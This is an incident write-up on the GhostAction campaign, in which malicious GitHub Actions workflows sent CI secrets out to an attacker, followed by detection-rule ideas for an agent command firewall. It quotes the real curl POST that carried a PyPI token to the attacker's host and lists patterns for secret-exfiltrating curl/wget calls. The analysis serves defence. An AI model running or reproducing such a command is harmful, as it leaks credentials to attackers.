# GhostAction workflows POSTed CI secrets straight to an attacker HTTP endpoint

- Date: 2025-09-05 | Agent/tool: GitHub Actions workflows (curl inside the CI build tooling) | Axis: exfil

## What happened

On September 5, 2025 GitGuardian disclosed the GhostAction campaign. Attackers with write access to victim repositories added or replaced GitHub Actions workflows named "Github Actions Security". The workflow triggered on every push and ran one step: a `curl` that POSTed the repository's CI secrets to an attacker-controlled endpoint. GitGuardian tied it to 327 GitHub users across 817 repositories, with 3,325 secrets stolen, including PyPI tokens, AWS access keys, and database credentials. Affected developers confirmed the attacker was actively using the stolen secrets. The exfiltration itself was a single, boring HTTPS POST from the CI runner.

## How it went wrong

The workflow step was literally:

`curl -s -X POST -d 'PYPI_API_TOKEN=${{ secrets.PYPI_API_TOKEN }}&...' https://bold-dhawan.45-139-104-115.plesk.page`

The Actions runner interpolates `${{ secrets.* }}` into the command text before spawning anything. So at the OS level the CI machine just runs `curl` whose argv contains the cleartext tokens plus a POST to a strange host on a plesk.page domain. No exploit, no malware file, no persistence — one exec event with a loud argv and one network_connect. The same pattern works on a developer laptop from any agent-driven script: build the body from a secret, POST it out.

## What the firewall should learn

Because the runner interpolates before exec, `exec(curl, argv)` alone contains the secret and the destination — a highly implementable signal. Rule ideas: (1) approval_required or deny for `exec` of curl/wget with a `-d`/`--data` body that matches secret material (long tokens, `KEY=value` chains) or that POSTs to a host outside known package/API registries; (2) correlate a `file_open` read of a credential file with a same-ancestry `network_connect` or upload argv to an unknown host; (3) flag `input` (script text) that builds POST bodies from `${{ secrets.* }}` or `$ENV`-style expansions feeding curl.

## Sources

- [GitGuardian: The GhostAction Campaign — 3,325 Secrets Stolen](https://blog.gitguardian.com/ghostaction-campaign-3-325-secrets-stolen/)
- [StepSecurity: GhostAction Campaign — Over 3,000 Secrets Stolen Through Malicious GitHub Workflows](https://www.stepsecurity.io/blog/ghostaction-campaign-over-3-000-secrets-stolen-through-malicious-github-workflows)
- [Wiz Cloud Threat Landscape: GhostAction campaign](https://threats.wiz.io/all-incidents/ghostaction-campaign)
